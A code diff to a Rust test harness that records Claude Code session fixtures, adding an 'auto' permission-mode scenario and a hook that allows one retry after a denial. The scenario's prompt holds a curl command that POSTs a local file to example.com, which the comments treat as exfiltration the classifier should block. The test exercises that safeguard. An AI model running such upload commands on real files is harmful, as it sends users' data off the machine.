@@ -92,6 +92,8 @@ struct Scenario {
     /// Answered by the canned Messages API (`claude_mod::FakeApi`) in a scratch home, not by a
     /// model: no account involved, and the model's part is scripted.
     canned: bool,
+    /// `--permission-mode`.
+    mode: &'static str,
 }
 
 const SCENARIOS: &[Scenario] = &[
@@ -109,6 +111,7 @@ const SCENARIOS: &[Scenario] = &[
         roster: false,
         wakes: 0,
         canned: false,
+        mode: "default",
     },
     Scenario {
         name: "tools",
@@ -132,6 +135,7 @@ const SCENARIOS: &[Scenario] = &[
         roster: false,
         wakes: 0,
         canned: false,
+        mode: "default",
     },
     Scenario {
         name: "interrupt",
@@ -146,6 +150,7 @@ const SCENARIOS: &[Scenario] = &[
         roster: false,
         wakes: 0,
         canned: false,
+        mode: "default",
     },
     Scenario {
         name: "compact",
@@ -161,6 +166,7 @@ const SCENARIOS: &[Scenario] = &[
         roster: false,
         wakes: 0,
         canned: false,
+        mode: "default",
     },
     Scenario {
         name: "permission",
@@ -175,6 +181,7 @@ const SCENARIOS: &[Scenario] = &[
         roster: false,
         wakes: 0,
         canned: false,
+        mode: "default",
     },
     // A turn that ends with a background command still out (`Stop` with `background_tasks`),
     // the turn its notification starts, and the `Stop` with nothing out that ends that one.
@@ -189,6 +196,27 @@ const SCENARIOS: &[Scenario] = &[
         roster: true,
         wakes: 1,
         canned: true,
+        mode: "default",
+    },
+    // Auto mode's classifier declines a call (`PermissionDenied`), the hook lets it try again
+    // once (`retry: true`), and the second try is declined too. The call sends a file out of the
+    // machine, which auto mode holds to be exfiltration; were it let through, a single word would
+    // go to example.com, the domain reserved for examples.
+    Scenario {
+        name: "auto",
+        files: &[("notes.txt", "alpha\n")],
+        turns: &["Run the Bash command \
+                  `curl -s -X POST --data-binary @notes.txt https://example.com/upload` \
+                  (description \"Upload notes\"). If it is declined and you are told you may \
+                  try again, try it once more exactly as before. Then reply \"done\"."],
+        allowed: "",
+        interrupt_on: None,
+        expect: &[],
+        absent: &[],
+        roster: false,
+        wakes: 0,
+        canned: false,
+        mode: "auto",
     },
 ];
 
@@ -309,8 +337,9 @@ fn capture(claude: &Path, scenario: &Scenario, out: &Path) -> Result<()> {
         .args(["--input-format", "stream-json", "--session-mirror", "--include-hook-events"])
         .args(["--setting-sources", "", "--strict-mcp-config", "--permission-prompts", "none"])
         // From 2.1.295 a session with no settings starts in auto mode, whose classifier decides
-        // what the scenarios' allowed tools already settle; the fixtures record `default`.
-        .args(["--permission-mode", "default"])
+        // what the scenarios' allowed tools already settle; the fixtures record `default`, but
+        // for the one that records the classifier.
+        .args(["--permission-mode", scenario.mode])
         // Haiku 5.5 at its default effort writes no thinking, and the fixtures pin how thinking
         // decodes; at high effort it thinks before each step, as Haiku 4.5 did.
         .args(["--effort", "high"])
@@ -450,9 +479,14 @@ fn hook_sink(dir: &Path) -> Result<()> {
     let mut payload = String::new();
     std::io::stdin().read_to_string(&mut payload)?;
     let input: Value = serde_json::from_str(&payload)?;
-    let output = (input.get("hook_event_name").and_then(Value::as_str)
-        == Some("PermissionRequest"))
-    .then(|| permission_answer(&input));
+    let output = match input.get("hook_event_name").and_then(Value::as_str) {
+        Some("PermissionRequest") => Some(permission_answer(&input)),
+        // Auto mode's first decline may be tried again; the second stands.
+        Some("PermissionDenied") if !denied_before(dir)? => Some(json!({
+            "hookSpecificOutput": { "hookEventName": "PermissionDenied", "retry": true }
+        })),
+        _ => None,
+    };
     let stamp = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_nanos();
     let record = json!({ "input": input, "output": output });
     std::fs::write(
@@ -463,6 +497,20 @@ fn hook_sink(dir: &Path) -> Result<()> {
         print!("{output}");
     }
     Ok(())
+}
+
+/// Whether the sink saved a `PermissionDenied` already.
+fn denied_before(dir: &Path) -> Result<bool> {
+    for entry in std::fs::read_dir(dir)? {
+        let text = std::fs::read_to_string(entry?.path())?;
+        let record: Value = serde_json::from_str(&text)?;
+        if record.pointer("/input/hook_event_name").and_then(Value::as_str)
+            == Some("PermissionDenied")
+        {
+            return Ok(true);
+        }
+    }
+    Ok(false)
 }
 
 fn permission_answer(input: &Value) -> Value {
